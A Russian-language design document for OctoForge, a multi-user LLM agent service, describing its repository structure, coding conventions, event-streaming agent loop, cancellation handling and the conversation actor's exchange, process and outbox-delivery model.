# OctoForge — мультипользовательский LLM-агент (аналог openclaw, знания в БД)

> Дизайн-документ. Живой: обновляется по мере развития идеи, до и во время реализации.

## Концепция

Агент на Python/FastAPI/SQLAlchemy. Отличия от openclaw:

- **Знания и скилы — в БД** (SQLite через async SQLAlchemy), а не в файлах.
- **Скилы — исполняемые Jinja-шаблоны (DSL)**: рендер шаблона = выполнение. Скилы общие для всех пользователей.
- **Мультипользовательность**: токен на пользователя, знания изолированы по `user_id`, скилы — общие.
- **Фоновые задачи**: агент может увести работу в фон и вернуться с результатом.

## Инженерные практики

Конвенции кода зафиксированы в `AGENTS.md` — это источник истины для всех, кто пишет код проекта. Суть:

- все даты — timezone-aware UTC, время только через хелпер `utc_now()` (`octoforge_core/time.py`);
- полная типизация (ruff `ANN` + mypy strict), объекты вместо словарей, перечисления через `StrEnum`, без магических строк и чисел;
- тесты в том же изменении, что и код;
- чистая архитектура: библиотека `core/` (домен + логика, чистый Python) и приложение `web/` (FastAPI) — физически разные проекты со своими зависимостями и тестами;
- DI: зависимости передаём снаружи (конструктор, параметры, `Depends`), объекты внутри методов не создаём;
- проверки в порядке «линтер → типы → тесты», одна команда `make check`;
- контроль сложности: `C901` ≤ 10, `PLR0915` ≤ 50 statements, `PLR0911` ≤ 6 return'ов — превышение решаем дроблением, а не noqa;
- языки: документация и общение — на русском, коммиты и docstrings — на английском;
- любое изменение логики или новая идея дописывается в эту документацию в том же изменении;
- коммиты — только с явного разрешения пользователя.

## Структура репозитория

Монорепо из двух независимых Python-проектов (src-layout), у каждого свой `pyproject.toml`,
свои зависимости и свои тесты. Web-приложение зависит от библиотеки.

```
Makefile, README.md, .env.example
core/                          # библиотека octoforge-core — домен и логика; fastapi запрещён
  pyproject.toml               # deps: httpx, sqlalchemy[asyncio], aiosqlite, croniter;
                               #   dev: pytest, pytest-asyncio, ruff, mypy
  src/octoforge_core/
    domain.py                  # ChatMessage, ToolCall, MessageRole, Dialog
    config.py                  # LLMConfig, EmbeddingConfig, RerankerConfig, HttpRerankerConfig
    time.py                    # utc_now() — единая точка времени (UTC aware)
    errors.py                  # LLMResponseError
    ports.py                   # Protocol-порты: LLMClient, TaskStore
    composition.py             # переиспользуемые builder'ы сборки (P5): build_llm_client,
                               #   build_instruction_service, build_dataset_service,
                               #   build_external_executor, build_tool_registry,
                               #   build_agent_loop, build_compactor, build_router,
                               #   build_cron_outcome_reporter, build_runner_config,
                               #   build_conversation_manager, build_cron_scheduler;
                               #   бандлы ToolLimits/ToolStores/ToolServices/RunnerOptions;
                               #   только порты и конфиги, без fastapi и web-Settings
    agent/
      events.py                # LoopEvent: IterationStarted, TextDelta, AssistantMessage,
                               #   ToolCallRequested/Completed/Failed, Finished, Cancelled, Failed,
                               #   ProcessStarted/Completed (маркеры актора)
      control.py               # LoopControl — флаг отмены прогона (инъекции упразднены pull-моделью)
      loop.py                  # AgentLoop.stream(history, control, context) → AsyncIterator[LoopEvent]
      router.py                # MessageRouter (Protocol), RouteAction/RouteOp/RouteDecision,
                               #   ProcessInfo/ProcessPlace, LLMRouter (one-shot tool call, таймаут, фолбэк)
      prompts.py               # порты промптов: PromptProvider (Protocol) + StaticPromptProvider
                               #   поверх вшитых DEFAULT_SYSTEM_PROMPT (мета-правила: answer-first,
                               #   recall на непокрытый интент, сохранение по
                               #   аудитории (сценарий/память/knowledge), формат markdown)
                               #   и ROUTER_SYSTEM_PROMPT (роутинг процессов);
                               #   имена SYSTEM/ROUTER_PROMPT_NAME
      runner.py                # ConversationRunner (актор-брокер: нарратив + процессы fg/bg,
                               #   каждый подкреплён задачей, outbox-доставка результатов
                               #   без LLM, bound TaskSpawner, wake для крон-выстрелов, порт
                               #   TaskOutcomeListener для исходов cron-задач),
                               #   ConversationManager, RunnerConfig, ConversationEvent
    tools/                     # фреймворк тулов; реализации — в доменных модулях:
                               #   cron/tools.py, memory/tools.py, datasets/tools.py,
                               #   context/tools.py, tasks/tools.py, search/tools.py,
                               #   net/tools.py, instructions/tools.py
      base.py                  # Tool (Protocol), ToolSpec, ToolContext (+ опциональные task_spawner/task_deleter, owner_task_id)
      registry.py, errors.py   # реестр + ошибки
    tasks/
      api.py                   # граница модуля: Task, TaskKind (RUN|ANSWER), TaskStatus, TaskNotFoundError
      models.py                # TaskRow — таблица tasks, собственность модуля
      store.py                 # порт TaskStore + InMemoryTaskStore + SqlAlchemyTaskStore
    dialogs/
      api.py                   # граница модуля: DialogNotFoundError, MessageStats
      models.py                # DialogRow + MessageRow — таблицы dialogs/messages, собственность модуля
      store.py                 # DialogRepository, MessageRepository (atomic seq, append_pair, идемпотентность)
    db/                        # ТОЛЬКО framework (аудит границ 2026-07-27): доменных таблиц здесь нет
      base.py                  # Declarative Base + UTCDateTime (aware UTC на чтении/записи)
      engine.py                # create_engine/create_session_factory (DI) + bootstrap_schema
                               #   (Alembic upgrade/stamp) + init_db (create_all, fallback/тесты)
      migrations/              # Alembic: ЕДИНАЯ цепочка на базу (осознанно НЕ разложена по модулям:
                               #   история глобальна и линейна, миграции пересекают границы модулей —
                               #   f2a6c8d1e935 переносит memories→instructions; пер-модульные цепочки
                               #   уместны только у модулей со СВОЕЙ базой, как telegram/invites)
    llm/
      events.py                # StreamEvent: TextDelta | StreamFinished
      openai.py                # OpenAI-совместимый клиент: complete() + stream() (SSE, tools)
      embeddings.py            # EmbeddingClient (Protocol-порт) + OpenAI-совместимый клиент
                               #   (POST /embeddings); порт общий для instructions/ и datasets/
      local_embeddings.py      # локальный бэкенд эмбеддингов: sentence-transformers bi-encoder
                               #   (как в b2e), L2-нормализация, вычисление в asyncio.to_thread
      reranker.py              # RerankerClient (Protocol-порт) + кросс-энкодер (MPS при наличии)
      http_reranker.py         # HTTP-бэкенд реранка: SiliconFlow-совместимый POST /rerank
    instructions/              # обособленный модуль инструкций (только хранение/поиск/ранг)
      api.py                   # граница модуля: InstructionService (Protocol), Instruction,
                               #   InstructionType, SearchHit, InstructionNotFoundError,
                               #   порт хранилища InstructionStore + EmbeddedInstruction +
                               #   capability-порт InstructionVectorSearch (runtime_checkable)
      models.py                # InstructionRow — таблица instructions, собственность модуля
      store.py                 # SqlAlchemyInstructionStore (сессии через async_sessionmaker, DI)
      ranking.py               # чистые функции: cosine + буст точного title + реранк-мерж
      local.py                 # LocalInstructionService — локальная реализация фасада
                               #   (store инъектируется; vector-capable store → search_by_vector)
      registry.py              # SystemSkill + CORE_SYSTEM_SKILLS (8 системных сценариев)
                               #   + sync_system_registry (синк системной части стора при старте)
      tools.py                 # recall (полные сценарии + id в выдаче, фильтр type),
                               #   instruction_save (приватные записи), instruction_delete (по id)
    datasets/                  # обособленный модуль датасетов (per-user трекеры, этап C)
      api.py                   # граница модуля: DatasetService (Protocol), Dataset, DatasetRecord,
                               #   DatasetSchema/FieldType, DatasetHit, ошибки модуля,
                               #   порт хранилища DatasetStore + EmbeddedDataset +
                               #   capability-порт DatasetVectorSearch (runtime_checkable)
      models.py                # DatasetRow + DatasetRecordRow — таблицы datasets/dataset_records
      validation.py            # parse_schema/dump_schema/validate_record (схема и записи)
      store.py                 # SqlAlchemyDatasetStore (явный каскад удаления)
      ranking.py               # свои чистые функции: cosine + буст точного имени (независимость)
      service.py               # LocalDatasetService — локальная реализация фасада
                               #   (store инъектируется; MAX_SCAN_ROWS)
    memory/                    # тонкий модуль памяти (этап D; хранение — в сторе инструкций)
      api.py                   # DTO Memory для консоли оператора
      tools.py                 # интентные тулы memory_store / memory_delete
    context/                   # обособленный модуль контекста: компакция нарратива + поиск по архиву
      api.py                   # граница модуля: ContextCompactor/SummaryStore/MessageArchive
                               #   (Protocol-порты), DialogueSummary/ArchivedMessage/ArchiveFilter
      models.py                # SummaryRow — таблица dialog_summaries, собственность модуля
      store.py                 # SqlAlchemySummaryStore (оба порта: саммари + read-only архив)
      compactor.py             # LlmContextCompactor (темы + горячий хвост, фоновая компакция
                               #   с guard'ом на диалог), NoopContextCompactor, CompactorConfig
      prompts.py               # промпт суммаризации + разбор ответа (TOPICS/SUMMARY)
    cron/                      # обособленный модуль крон-задач (этап F)
      api.py                   # граница модуля: CronStore/CronWaker/Scheduler (Protocol-порты),
                               #   CronJob, ошибки, compute_next_fire/count_missed
                               #   (croniter + zoneinfo) — публичный контракт для
                               #   альтернативных движков планирования
      models.py                # CronJobRow — таблица cron_jobs, собственность модуля
      store.py                 # SqlAlchemyCronStore (CRUD + due-выборка + CAS-аренда
                               #   + record_fire_result)
      scheduler.py             # CronScheduler (реализация порта Scheduler: asyncio-цикл
                               #   claim → wake → complete_fire, coalesce пропущенных,
                               #   разброс и лимит догонялки)
      reporter.py              # CronOutcomeReporter — исход процесса в стор: фиксация
                               #   статуса/ошибки без ретраев, удаление one-shot после DONE и FAILED
      waker.py                 # ManagerCronWaker — адаптер порта на ConversationManager
    search/                    # обособленный модуль веб-поиска (порт провайдера)
      api.py                   # граница модуля: SearchProvider (Protocol), SearchResult,
                               #   SearchResponse, SearchError — транспорт-нейтральные DTO
      serper.py                # SerperSearchProvider — дефолтная реализация (serper.dev)
    net/                       # исполнение внешних вызовов (core-сторона, вне модуля)
      guard.py                 # SsrfGuard: resolve хоста (resolver инъектируется) → ipaddress-проверки;
                               #   allowed_prefixes для собственного base URL (пропуск до resolve)
      tool_spec.py             # ToolSpec + parse_tool_spec (JSON-формат tool-записи)
      external.py              # ExternalCallExecutor: шаблоны, whitelist-авторизация
                               #   (+ темплейт {user_id} в значении заголовка), SSRF-гвард
      errors.py                # SsrfBlockedError, ToolSpecError, ExternalCallError
    # дальше: tools/dynamic/ (Jinja-движок)
  tests/                       # test_agent_loop, test_composition, test_conversation_runner,
                               # test_cron_store,
                               # test_cron_scheduler, test_data_tools,
                               # test_datasets, test_datasets_store_port, test_dataset_validation,
                               # test_db_repositories, test_embeddings, test_external_call,
                               # test_http_request_tool, test_instruction_tools,
                               # test_instructions_local, test_instructions_store_port,
                               # test_memory, test_memory_tools,
                               # test_openai_client, test_openai_stream, test_prompts,
                               # test_router, test_serper_provider, test_tools_registry,
                               # test_ssrf_guard, test_tasks, test_web_search_tool
web/                           # приложение octoforge-web — FastAPI-обёртка
  pyproject.toml               # deps: octoforge-core, fastapi, uvicorn, pydantic-settings
  src/octoforge_web/
    main.py                    # app factory + composition root (DI поверх builder'ов
                               #   octoforge_core.composition: БД, LLM, эмбеддер, реестр,
                               #   исполнитель external_call, LLMRouter, акторы, крон-планировщик,
                               #   telegram-адаптер; канал "web")
    config.py                  # Settings (env с префиксом OF_, включая OF_DATABASE_URL,
                               #   OF_EMBEDDING_*, OF_INSTRUCTIONS_TOP_K,
                               #   OF_EXTERNAL_CALL_AUTH_WHITELIST, OF_DATASETS_QUERY_*,
                               #   OF_MEMORY_SEARCH_*, OF_MAX_PROCESSES, OF_ROUTER_TIMEOUT_SECONDS,
                               #   OF_SELF_BASE_URL, OF_CRON_*, OF_TELEGRAM_*, OF_SERPER_TOKEN,
                               #   OF_SYSTEM_PROMPT_SOURCE / OF_ROUTER_PROMPT_SOURCE)
    prompts.py                 # FilePromptProvider — промпты из файлов (file:), fallback
                               #   на StaticPromptProvider; перечитывает файл на каждый get()
    deps.py                    # провайдеры зависимостей из app.state + заголовок X-User-Id
    api/
      dialog.py                # messages/cancel/events(SSE) по (user_id, channel)
      cron.py                  # cron jobs CRUD + pause/resume (query-параметры, X-User-Id)
      sse.py                   # сериализация LoopEvent → SSE-кадры (включая маркеры процессов)
      schemas.py               # pydantic-схемы запросов/ответов
    telegram/                  # Telegram-адаптер (этап G): вторая поверхность, канал "telegram"
      models.py                # pydantic-модели Bot API (update/message/chat/user, extra=ignore)
      client.py                # порт TelegramClient + TelegramBotClient на httpx (getUpdates,
                               #   sendMessage, editMessageText + rich_message, sendChatAction)
      bridge.py                # TelegramBridge: события runner'а → черновик с throttle-правками,
                               #   чанкер 4096, статус-строки тулов; текст → runner.submit
      markdown.py              # markdown → Telegram-HTML (parse_mode=HTML) + split_html_safe
      rich.py                  # needs_rich_message: детектор таблиц/чеклистов/details/math
                               #   для rich-апгрейда финала (Bot API 10.1)
      poller.py                # TelegramPoller (long-poll, offset, backlog-drain, backoff) +
                               #   TelegramBridgeRegistry (get-or-create + прогрев из БД)
      __main__.py              # standalone-запуск: только Telegram-адаптер, без HTTP API
                               #   (python -m octoforge_web.telegram; порт не слушается)
    static/index.html          # чат-UI: SSE-стрим, шаги тулов, маркеры процессов,
                               #   кнопка «Стоп», поле имени (= user_id)
  tests/                       # test_dialog_api.py, test_cron_api.py, test_sse.py, test_config.py,
                               # test_system_skills.py, test_prompts.py, test_modularity.py,
                               # test_telegram_models.py, test_telegram_bridge.py,
                               # test_telegram_poller.py, test_telegram_client.py,
                               # test_telegram_standalone.py, test_telegram_markdown.py,
                               # test_telegram_rich.py
```

## Петля агента: события, управление, актор

### Петля как поток событий (`octoforge_core/agent/loop.py`)

`AgentLoop.stream(history, control, context) -> AsyncIterator[LoopEvent]` — не «возвращает ответ»,
а выдаёт поток событий (`agent/events.py`):

- `IterationStarted(index)` — начало итерации рассуждения;
- `TextDelta(text)` — токен ответа по мере стриминга LLM;
- `AssistantMessage(message, interrupted)` — завершённое сообщение итерации (interrupted — обрыв по отмене);
- `ToolCallRequested / ToolCallCompleted(output) / ToolCallFailed(error)` — шаги тулов;
- `Finished(message)` — финальный ответ; `Cancelled` — отмена; `Failed(error)` — срыв без ответа;
- `ProcessStarted(process_id, title, source_client_message_id)` и
  `ProcessCompleted(process_id, title, status)` — маркеры уровня актора (не петли):
  «сейчас начнётся текст этого ответа» (идёт перед первым токеном **каждого**
  answer-прогона и первым событием каждой outbox-доставки; несёт цель реплая) /
  процесс завершился со статусом (значение TaskStatus); эмитятся актором, в union
  `LoopEvent` входят для общего канала доставки. До транспорта события доезжают в
  конверте `ConversationEvent(dialog_id, seq, payload, exchange_id)`: `exchange_id`
  адресует событие черновику/пузырю его обмена.

`history` мутируется на месте (в неё дописываются новые сообщения) — владелец списка (актор)
забирает накопленное в историю диалога.

**Eager-исполнение тулов.** Стрим LLM несёт инкрементальные события тул-коллов
(`llm/events.py`): `ToolCallStarted` (появились id+имя слота), `ToolCallReady` (аргументы
достриманы и распарсились), `ToolCallBroken` (JSON не собрался). На `Ready` петля сразу
запускает исполнение (`asyncio.create_task`, событие `ToolCallRequested`), не дожидаясь
конца сообщения; результаты сливаются через очередь и эмитятся по мере готовности.
В историю tool-сообщения пишутся строго в порядке вызовов после assistant-сообщения
(детерминизм при конкурентном исполнении). `Broken` не исполняется: в его очередь —
`ToolCallFailed` и tool-сообщение `error: ...`. Провайдер без инкрементальных дельт
(ни одного `Ready`/`Broken` за стрим) — fallback: вызовы финального сообщения стартуют
после `StreamFinished`, как раньше. Владелец задач — внутренний трекер петли
(`_ToolRunTracker`: spawn/дрен/ожидание/отмена).

**Idle-watchdog стрима.** Пауза между событиями стрима (включая ожидание первого)
ограничена таймаутом `stream_idle_timeout` (параметр `AgentLoop`, `None` = выключен;
конфиг `OF_LLM_STREAM_IDLE_TIMEOUT_SECONDS`, дефолт 120, 0 = выключен). Таймаут обрывает
стрим (`aclose`), отменяет запущенные тулы и завершает прогон `Failed("LLM stream idle
timeout")`. Подробности — [streaming.md](streaming.md).

### Управление прогоном (`agent/control.py`)

`LoopControl` — только флаг отмены. Канал инъекций упразднён pull-моделью: ветка процесса
перечитывает narrative-часть на каждой итерации (см. «Актор диалога»), поэтому внешние
сообщения в прогон больше не подмешиваются. Точки обработки отмены:

- перед каждым вызовом LLM — проверка флага: прогон завершается `Cancelled`;
- на каждый чанк стрима — проверка отмены: стрим обрывается (`aclose`), запущенные тулы
  отменяются, частичный текст сохраняется как `AssistantMessage(interrupted=True)` с пришедшими
  tool_calls (на каждый — tool-ответ «cancelled» или реальный результат, если успел),
  эмитится `Cancelled`.

### Актор диалога: нарратив, обмены и процессы (`agent/runner.py`)

`ConversationRunner` — актор на диалог: единый inbox команд (`_Submit`, `_Flush`,
`_ProcessTerminated`) сериализует всё, что происходит с диалогом (отмена — вне
инбокса, см. ниже). Владеет **нарративом**
(in-memory; при создании загружается только горячий срез — сообщения после границы
компакции, `compacted_boundary` + `list_after`) и **процессами** (`dict[id, _Process]`,
in-memory), ведёт подписчиков (очереди для broadcast, seq нумерация событий). Ядро
модели — **обмен** (exchange): durable-обязательство перед пользователем (его вопрос,
уточнения к нему и итоговый ответ), строка таблицы `exchanges` + `messages.exchange_id`,
со статусами `OPEN → IN_PROGRESS → ANSWERED / AWAITING_USER / CANCELLED / FAILED`.
Полное описание модели, её мотивация и история выката — [exchanges.md](exchanges.md);
здесь — конспект.

Решения аудита 2026-07-26 (корректность/отзывчивость/память):

- **Отмена действует немедленно.** `cancel()` не идёт через inbox (актор может быть
  занят роутерным LLM-вызовом до `OF_ROUTER_TIMEOUT_SECONDS` — команда ждала бы за
  ним), а напрямую гасит `LoopControl` answer-прогонов; петля гоняет флаг отмены
  наперегонки и с ожиданием стрима (молчащий провайдер больше не держит стоп до
  idle-таймаута — было до 120 с), и с ожиданием тулов (стоп во время долгого
  HTTP-вызова абортирует оставшиеся раны, их ответы — "cancelled").
- **Медленный подписчик не теряет результат.** `_broadcast` при полной очереди (100)
  дропает только поток (TextDelta, tool-события); критические события (терминалы,
  маркеры процессов) вытесняют старейшее из очереди и ложатся всегда, а
  `_flush_deliveries` штампует `delivered_at` только если терминал принят хотя бы
  одной очередью.
- **В памяти — только горячий хвост.** `assemble` возвращает `AssembledContext`
  (messages + `tail_count`), и актор после каждой пересборки обрезает `_narrative`
  до хвоста (`_trim_narrative`): скомпакченное уходит из RAM и остаётся достижимым
  через topics-блок и `history_search` — ровно как в промпте. Watermark'и процессов
  сдвигаются на срезанное число; принадлежность сообщений обменам живёт в БД
  (`messages.exchange_id`), а не в индексных множествах в памяти — индексы ехали бы
  под очередью команд при обрезке.
- **Инициализация раннеров не сериализуется глобально.** Лок `ConversationManager`
  держится только вокруг карты сборок; сама сборка (диалог + история из БД) —
  мемоизированная задача на (user, channel): конкурентные вызовы одного диалога
  делят одну сборку, разные диалоги не ждут друг друга.

Решения аудита 28.07.2026 (акторные гонки при пересборке ветки и settle обмена):

- **Водяная метка — строго из снапшота компактора.** `_assemble_narrative`
  возвращает `(narrative, watermark)`, где `watermark` — это
  `AssembledContext.snapshot_len`, а не длина живого `_narrative` на момент
  возврата; сборки веток сериализованы per-раннер (`_assemble_lock`, порядок
  локов `spawn_lock → assemble_lock`), а `_trim_narrative` режет память по тому
  же снапшоту. Сообщение, дописанное в нарратив во время `await` сборки, тем
  самым гарантированно остаётся либо выше метки (её ещё увидит следующий sync),
  либо уже попало в ветку — водяная метка снова строго «оптимизация +
  безопасное направление ошибки», не источник тихой потери.
- **Свипер «OPEN без владельца» подключён.** `ExchangeRepository.list_unowned_open`
  реализован и вызывается и на старте (`ConversationManager.recover_interrupted`,
  после `reopen_in_progress` и рестарта осиротевших задач — см. «Фоновые
  задачи»), и при освобождении слота (`_sweep_unowned_open` в хвосте
  `_handle_terminated`). Отказ по лимиту в фоновом свипе тихий (следующий
  освободившийся слот подхватит сам), пользовательский путь
  (`_resume_open_exchange` из маршрутизации) уведомляет как обычно.
- **Доставка стрима подтверждается, а не предполагается.** `terminal_accepted`
  на процессе фиксирует, принял ли `_broadcast` терминал (`Finished`/`Failed`)
  хотя бы одной подписческой очередью; `_handle_terminated` штампует
  `delivered_at` только когда это так, иначе результат уходит в outbox целиком,
  как обычная недоставленная задача. Перезагрузка вкладки или упавший
  Telegram-бридж ровно в момент финала больше не теряют ответ молча.
- **Стоп-кнопка закрывает и `AWAITING_USER`.** `cancel()` (помимо отмены живых
  answer-прогонов) закрывает `AWAITING_USER`-обмены, чей владеющий прогон уже
  не жив (`_cancel_parked_exchanges`) — иначе событийный nudge продолжал бы
  напоминать про вопрос, который пользователь только что перестал ждать.
- **Outbox удаляет доставленное по identity.** `_Delivery` — `eq=False`:
  `_flush_deliveries` убирает сфлашенную запись по объекту, а не по позиции —
  вопрос `ask_user`, вклинившийся в голову очереди (`appendleft`) во время
  `await` середины флаша, не путается с обычным `popleft()`. Сбой после того,
  как сообщение уже персистировано (например, роутер уронил исключение),
  теперь тоже отвечает пользователю: catch-all в `_run_actor` шлёт
  `Failed(SUBMIT_FAILED_ERROR)` для любой упавшей `_Submit`-команды, а не
  только для сбоя самого `_persist`. Полное описание — «Аудит стабильности
  28.07.2026» в [exchanges.md](exchanges.md).

Основные правила:

- **Обмен ≠ задача.** Задача (`tasks`) описывает один прогон; обмен — обязательство,
  которое живёт дольше прогона: прогон может завершиться DONE, не закрыв обмен
  (задал уточняющий вопрос → `AWAITING_USER`). Answer-задача несёт `exchange_id`
  в `task.input` — рестарт восстанавливает связку; `OPEN` — единственное состояние,
  означающее «работа для системы», на нём же держится startup-recovery
  (IN_PROGRESS-обмены при старте сбрасываются в OPEN — их процессы умерли;
  AWAITING_USER не трогается — тот ждёт человека).
- **Процесс** — один прогон петли со своей веткой истории, подкреплён записью задачи
  (`process.id == task.id`; kind ANSWER — прогон, должный обмену ответ, RUN —
  task_create/крон). Ветка narrative-процесса =
  `[system prompt] + снапшот нарратива от компактора + приватный рабочий суффикс`;
  на каждом `IterationStarted` narrative-часть перечитывается (pull-модель; без
  изменений — байт-идентична). Ветка RUN-задачи самодостаточна
  (`BACKGROUND_TASK_PROMPT` + prompt задачи) и не синкается. **Форграунда нет**:
  каждый answer-прогон стримит свои события конкурентно, каждое событие уходит в
  конверте `ConversationEvent` с `exchange_id` — транспорт держит черновик/пузырь
  на обмен. Маркеры `ProcessStarted`/`ProcessCompleted` broadcast'ятся всегда.
- **Нарратив** = user-сообщения + финальные ответы завершённых процессов (с `task_id`
  и `exchange_id`) + заметки брокера (отказ по лимиту, nudge, вопросы `ask_user`) +
  salvaged-фрагменты прерванных ответов. Только нарратив персистится в `messages`;
  промежуточные assistant/tool-сообщения ветки — нет. Диалог переживает перезапуск
  за счёт пересборки нарратива; **процессы — нет** (in-memory), их задачи
  перезапускает startup-recovery (см. «Фоновые задачи»).
- **submit → маршрутизация → обмен**: user-сообщение персистится, затем решается,
  чьё оно (см. «Роутер сообщений»): детерминированный шорткат — транспортный реплай
  (`reply_to_exchange_id`) называет живой обмен без LLM; нет живых обменов → новый
  обмен без вызова; иначе LLM-роутер: NEW / CONTINUE(exchange) / COMMAND
  (+`cancel_ids`). Сообщение попадает в нарратив (и становится видно веткам) только
  **после** решения (`_apply_route`) — ветка, увидевшая его до маршрутизации, не
  могла знать, уточнение это или чужой будущий вопрос (окно стоило потерянного и
  задвоенного ответа, прод 28.07). NEW создаёт строку обмена и answer-прогон;
  CONTINUE отдаёт сообщение существующему обмену: живой владелец втянет его на
  следующем sync'е (pull-модель), обмен без живого прогона (OPEN / AWAITING_USER)
  получает свежий прогон (`_ensure_owner`).
- **Рендеринг ветки** (`agent/branch.py`, `render_branch`): роли сообщений выводятся
  из durable-состояния обменов, а не из позиции в ленте. Вопрос своего обмена —
  пометка «твоя задача» (`TASK_NOTE_TEMPLATE`), последующие сообщения того же
  обмена — «уточнение к твоей задаче»; **вопросы чужих живых обменов из ветки
  выбрасываются целиком** — пометка «занят другим прогоном» всё равно втягивала
  модель в ответ (live-замер 28.07: оба прогона ответили на свежайший вопрос);
  остальное — обычная история. Пометки живут только в копии ветки — нарратив и
  персист чистые, как с конвертом даты.
- **`ask_user`**: тул задаёт уточняющий вопрос — вопрос персистится и доставляется
  немедленно (в голову outbox-очереди: только он разблокирует обязательство), обмен
  переходит в `AWAITING_USER` (+`pending_question`), а финал прогона обмен **не**
  закрывает (`asked_user`). Владение обменом (`owner_task_id`) при этом
  **сохраняется за спрашивающим прогоном** — он ещё жив и завершается своим чередом
  после ack; если сбросить владельца здесь, быстрый ответ пользователя успел бы
  поднять второй прогон на тот же обмен, и оба стримили бы в один транспортный
  черновик. Реплика пользователя маршрутизируется в тот же обмен; пока владелец жив,
  её втягивает он сам через pull-модель на следующем sync'е — новый прогон не
  поднимается. **Nudge событийный**: новое сообщение при чужом AWAITING_USER-обмене
  старше `NUDGE_AFTER_SECONDS` (5 мин) — отдельное напоминание с цитатой собственного
  вопроса; отдельного таймера нет.
- **Терминация прогона** (`_settle_exchange`): порядок важен. Сперва guard
  владельца — если `exchange.owner_task_id` уже не совпадает с завершившейся
  задачей (обмен сменил хозяина, пока `_ProcessTerminated` лежала в inbox), settle
  пропускается целиком — новый владелец решает сам, а не эта уже устаревшая
  команда. Затем reopen по непросмотренным: если сообщения обмена пришли после
  последнего sync'а прогона (`_has_unseen_messages`, по watermark'у) — ответ их
  учесть не мог, обмен возвращается в `OPEN` и получает свежий прогон
  (`_resume_open_exchange`); это работает **и из `AWAITING_USER`** — реплика,
  доехавшая в хвост уже спросившего прогона, всё равно переоткрывает обмен. Из
  этого правила исключение — прогон, отменённый самим пользователем, непросмотренные
  сообщения его обмен не воскрешают (стоп пришёл позже сообщения, значит стоп его и
  накрывает). Наконец, если ничего из вышеперечисленного не сработало и обмен
  оставался в `AWAITING_USER` — он либо закрывается `CANCELLED` (пользователь
  остановил прогон), либо `ANSWERED` (прогон спросил, но всё же ответил непустым
  финалом — иначе его `pending_question` нудж не давал бы покоя вечно), либо
  остаётся ждать реплики. Во всех остальных случаях: DONE → ANSWERED, срыв → FAILED.
  Requeue-эвристику это заменило целиком: решает durable-состояние обмена, а не
  пере-submit сообщений.
- **Guardrail лимита** (детерминированный, `OF_MAX_PROCESSES`): NEW при
  `активных − отменённых этим решением + 1 > max` не создаёт обмен; вместо него
  шаблонное уведомление брокера со списком активных
  (`PROCESS_LIMIT_NOTICE_TEMPLATE`) — assistant-сообщение в нарративе + доставка
  через outbox, без LLM. User-сообщение остаётся в нарративе.
- **Доставка без LLM и без гейта** (outbox `_pending_deliveries`): гейт «когда
  форграунд свободен» растворился вместе с форграундом — заметки брокера и
  результаты RUN-задач/крона доставляются немедленно отдельными сообщениями
  (DONE → `TextDelta` полного результата + `Finished`, FAILED → `Failed`); после
  отправки проставляется `delivered_at`. Финал answer-прогона пользователь уже
  видел стримом в своём per-exchange сообщении — только проставляется
  `delivered_at`. Одна задача = одно сообщение; сбой записи `delivered_at`
  повторяет доставку (дубликат в транспорте — принятая цена за гарантию).
- **Нет подписчиков — нет доставки**: broadcast в пустое множество очередей не
  доходит ни до кого, поэтому без транспорта outbox не трогается и `delivered_at`
  не ставится (иначе результат терялся бы навсегда: startup-sweep пропускает
  проштампованную строку). Outbox — только эта гарантия удержания; сливается на
  следующем `subscribe()` (подписка кладёт в инбокс `_Flush`). Живые события
  стрима не реплеятся — реплеится только outbox.
- **Текущая дата — конвертом хвоста, не в системном промпте**: системный промпт ветки
  байт-стабилен (prefix-cache, см. [prompt-caching.md](prompt-caching.md)), а текущие
  дата/время UTC подставляются конвертом на последнее сообщение ветки
  (`_with_date_envelope`) — иначе модель гадает год. Нарратив и персист хранят чистую
  копию без конверта; то же при пересборке ветки после реактивной компакции.
- **Завершение процесса**: `Finished` → финал в нарратив + персист (с `task_id`,
  `exchange_id` и usage) + `mark_done`. **Пустой финал — осознанное молчание**
  (например, пользователь сказал «не надо»): задача завершается DONE и штампуется
  доставленной, но пустое сообщение не попадает ни в нарратив, ни в доставку;
  пустой финал логируется (INFO с id задачи) — молчание должно быть заметным.
  `Failed` → `mark_failed`; отмена → `mark_cancelled` + гигиена: прерванное
  assistant-сообщение с непустым текстом из приватного суффикса ветки +
  system-заметка о неполноте (`INTERRUPTED_NOTE`) дописываются в нарратив. Затем:
  процесс убирается, broadcast `ProcessCompleted(status)` (значения TaskStatus),
  в inbox — `_ProcessTerminated` (settle обмена + доставка исхода). Финализация
  обёрнута в `try/finally` (`_pump_process`): даже при сбое записи в стор процесс
  всегда убирается из `_processes` и слот `max_processes` освобождается.
- **Обработка `_ProcessTerminated`**: сперва settle обмена (см. выше), затем исход
  завершённой задачи встаёт в outbox (live-процесс — из терминального события,
  recovery — из сохранённых `task.result`/`task.error`; уже доставленное
  пропускается) и сливается при живом подписчике; отменённые задачи ничего не
  доставляют. Запись задачи остаётся в базе навсегда.
- `cancel()` (кнопка «Стоп» web / `/cancel` Telegram) останавливает **все
  answer-прогоны**; RUN-задачи (спавны, крон) живут своей жизнью — их останавливают
  `task_delete` или `cancel_ids` роутера. `stop()` — все процессы и сам актор:
  control-отмена процессов, прямая отмена pump-задач и таски актора **с ожиданием**
  (зависший стрим не должен вешать shutdown), затем `compactor.aclose(dialog_id)` —
  отменяется фоновая компакция только своего диалога (инстанс компактора один на
  менеджер). `ConversationManager.stop_all()` останавливает и снимает с регистрации все
  runner'ы; вызывается в `finally` `runtime()` при штатном shutdown (после остановки
  планировщика и telegram-адаптера, до `engine.dispose()`).
- **Супервизия и наблюдаемость**: цикл актора (`_run_actor`) ловит исключения обработки
  команды и логирует их — одна сбойная команда (например, ошибка стора в submit) не
  превращает диалог в зомби; `add_done_callback` логирует неожиданный выход актора.
  Если сбой команды совпадает с отменой таски актора, которую нижележащий код поглотил
  (например, ошибка стора подменила in-flight `CancelledError`), актор всё равно
  завершается (`task.cancelling() > 0` → re-raise `CancelledError`) — иначе `stop()` и
  teardown оставляли бы его зомби на `inbox.get()`.
  Ранее немые `except` (краш петли, сбой финализации, сбой доставки cron-wake) теперь
  логируются; потеря SSE-события по `QueueFull` считается (`_dropped_events`), а не
  молча глотается. В `core/` есть логгеры модулей (`runner`, `cron/scheduler`).
- `ConversationManager` — реестр runner'ов по dialog_id (создание под lock'ом),
  get-or-create диалога по (user_id, channel); конструктор принимает `RunnerConfig`
  (loop, prompts, router, max_processes, compactor, task_outcome_listener) + репозитории. Канал для ядра —
  непрозрачная строка; конкретные значения (`"web"`, будущий `"telegram"`) объявляют
  адаптеры в composition root.
